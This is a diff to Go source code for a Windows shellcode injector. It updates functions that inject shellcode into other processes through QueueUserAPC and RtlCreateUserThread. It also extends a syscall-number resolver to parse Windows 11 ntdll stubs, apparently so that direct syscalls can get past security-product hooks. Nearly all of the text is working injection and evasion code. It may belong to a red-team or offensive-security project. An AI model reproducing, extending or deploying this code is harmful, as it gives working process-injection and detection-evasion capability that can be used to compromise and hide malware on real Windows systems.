@@ -18,7 +18,8 @@ const (
 	threadAllAccess = 0x1FFFFF // THREAD_ALL_ACCESS
 
 	opcodeMovEax    = 0xB8
-	syscallScanSize = 10
+	opcodeMovR10Rcx = 0x4C // first byte of "4C 8B D1" (mov r10, rcx)
+	syscallScanSize = 32
 
 	threadWaitTimeout          = 2000
 	cpuDelayMaxIterations      = 5000000
@@ -319,7 +320,7 @@ func (w *windowsInjector) injectQueueUserAPC(shellcode []byte) error {
 	}
 
 	err = windows.WriteProcessMemory(
-		windows.Handle(hProcess),
+		hProcess,
 		addr,
 		&shellcode[0],
 		uintptr(len(shellcode)),
@@ -558,7 +559,7 @@ func (w *windowsInjector) injectRtlCreateUserThread(shellcode []byte) error {
 	}
 
 	err = windows.WriteProcessMemory(
-		windows.Handle(hProcess),
+		hProcess,
 		addr,
 		&shellcode[0],
 		uintptr(len(shellcode)),
@@ -597,12 +598,32 @@ func getSyscallNumber(funcName string) (uint16, error) {
 	addr := proc.Addr()
 
 	for i := 0; i < syscallScanSize; i++ {
+		// Bounds check: need at least 3 more bytes for "B8 XX XX"
+		if i+3 > syscallScanSize {
+			break
+		}
+
 		opcode := (*byte)(unsafe.Pointer(addr + uintptr(i)))
+
+		// Standard pattern: B8 XX XX 00 00 (mov eax, SSN)
 		if *opcode == opcodeMovEax {
 			byte1 := (*byte)(unsafe.Pointer(addr + uintptr(i+1)))
 			byte2 := (*byte)(unsafe.Pointer(addr + uintptr(i+2)))
 			syscallNum := uint16(*byte1) | (uint16(*byte2) << 8)
 			return syscallNum, nil
+		}
+
+		// Win11 ntdll pattern: 4C 8B D1 B8 XX XX 00 00 (mov r10, rcx; mov eax, SSN)
+		if i+7 <= syscallScanSize && *opcode == opcodeMovR10Rcx {
+			byte1 := (*byte)(unsafe.Pointer(addr + uintptr(i+1)))
+			byte2 := (*byte)(unsafe.Pointer(addr + uintptr(i+2)))
+			byte3 := (*byte)(unsafe.Pointer(addr + uintptr(i+3)))
+			if *byte1 == 0x8B && *byte2 == 0xD1 && *byte3 == opcodeMovEax {
+				lo := (*byte)(unsafe.Pointer(addr + uintptr(i+4)))
+				hi := (*byte)(unsafe.Pointer(addr + uintptr(i+5)))
+				syscallNum := uint16(*lo) | (uint16(*hi) << 8)
+				return syscallNum, nil
+			}
 		}
 	}
 
